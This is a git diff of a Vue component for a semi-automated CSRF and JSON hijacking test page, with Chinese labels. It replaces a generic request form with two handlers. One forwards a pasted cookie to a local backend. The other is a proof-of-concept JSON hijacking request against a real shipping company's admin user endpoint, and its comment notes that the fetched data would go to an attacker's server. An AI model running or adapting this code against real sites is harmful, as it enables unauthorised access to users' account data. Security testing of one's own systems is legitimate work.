@@ -4,44 +4,11 @@
         <p>
             该网站用于测试目标网站是否含有CSRF，采用半自动化进行发送请求.
         </p>
-        <h3>发送HTTP请求</h3>
-        <div>
-            <label>URL：</label>
-            <input v-model="url" type="text" class="url-input"/>
-        </div>
-        <div>
-            <label>请求类型：</label>
-            <select v-model="method">
-                <option value="POST">POST</option>
-                <option value="GET">GET</option>
-                <option value="PUT">PUT</option>
-                <option value="DELETE">DELETE</option>
-            </select>
-        </div>
-        <p>参数填写格式参考:</p>
-        <textarea class="param-input-such" readonly>
-            {
-                    "name": "John",
-                    "age": 30,
-                    "isStudent": true,
-                    "hobbies": ["reading", "swimming", "hiking"],
-                    "address": {
-                    "street": "123 Main St",
-                    "city": "Anytown",
-                    "state": "CA",
-                    "zip": "12345"
-                    }
-            }
-        </textarea>
-        <div>
-            <label>请求参数： </label>
-            <textarea v-model="body" class="param-input"></textarea>
-        </div>
-        <div>
-            <h2>Cookie</h2>
-            <textarea v-model="cookie" class="param-input"></textarea>
-        </div>
-        <button @click="sendRequest">发送</button>
+        <button @click="testCSRF">发送</button>
+        <p>
+            该网站用于测试目标网站是否含有JSON Hijacking，采用半自动化进行发送请求.
+        </p>
+        <button @click="testJSONHijacking">发送</button>
 
     </div>
 </template>
@@ -52,32 +19,41 @@
     export default {
         name: 'HelloWorld',
         props: {
-            msg: String
+            msg: String,
         },
         data() {
             return {
-                url: "",
-                method: "POST",
-                body: "",
                 cookie: "",
+                test: "",
+
             };
         },
         methods: {
-            sendRequest() {
+            testCSRF() {
                 axios.post('http://127.0.0.1:8082/test/csrf', {
-                    data: {
-                    url: this.url,
-                    body: this.body,
-                    cookie: this.cookie,
-                }}, {
-                    withCredentials: true, headers: {"Content-Type": "application/json"}}
-                    )
+                        data: {
+                            cookie: this.cookie,
+                        }
+                    }, {
+                        withCredentials: true, headers: {"Content-Type": "application/json"}
+                    }
+                )
                     .then(response => {
                         console.log(response.data);
                     })
                     .catch(error => {
                         console.log(error);
                     });
+            },
+            testJSONHijacking() {
+                var req = new XMLHttpRequest();
+                req.open('GET', 'https://freightsmart.oocl.com//api/admin/user/me', false);
+                req.send(null);
+                var json = JSON.parse(req.responseText);
+                // 将获取到的 JSON 数据提交给攻击者的服务器
+                // 这里只是简单的 alert 出来
+                alert(JSON.stringify(json));
+
             },
         },
     }
@@ -184,6 +160,7 @@
         color: #333;
         resize: vertical;
     }
+
     .param-input-such {
         width: 50%;
         height: 300px;
@@ -196,6 +173,7 @@
         color: #333;
         resize: vertical;
     }
+
     pre {
         background-color: #f4f4f4;
         padding: 1rem;
